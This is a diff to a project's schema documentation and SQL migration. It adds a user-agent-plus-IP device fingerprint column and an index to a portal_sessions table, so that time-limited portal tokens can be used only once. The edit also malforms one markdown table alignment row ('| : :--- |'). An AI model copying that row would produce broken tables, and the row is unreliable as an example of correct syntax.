@@ -21,10 +21,11 @@ Manages the dynamic, time-limited secure portal entry points.
 Tracks unique visitor sessions to ensure "One User = One Usage" logic.
 
 | Column | Type | Default | Description |
-| :--- | :--- | :--- | :--- |
+| :--- | :--- | :--- | : :--- |
 | `id` | uuid | `gen_random_uuid()` | Primary Key |
 | `token_id` | uuid | - | Foreign Key to `access_tokens.id` |
 | `session_id` | text | - | Unique identifier for the visitor's browser session |
+| `fingerprint` | text | - | Device fingerprint (UA + IP) to prevent usage abuse on cookie clear |
 | `created_at` | timestamptz | `now()` | Time when the session was first established |
 
 ### `wallet_submissions`
@@ -63,9 +64,13 @@ create table if not exists portal_sessions (
   id uuid default gen_random_uuid() primary key,
   token_id uuid references access_tokens(id) on delete cascade,
   session_id text not null,
+  fingerprint text,
   created_at timestamp with time zone default timezone('utc'::text, now()) not null,
   unique(token_id, session_id)
 );
+
+-- Index for fingerprint lookup
+create index if not exists idx_portal_sessions_fingerprint on portal_sessions(token_id, fingerprint);
 
 -- 3. Create wallet_submissions table
 create table if not exists wallet_submissions (
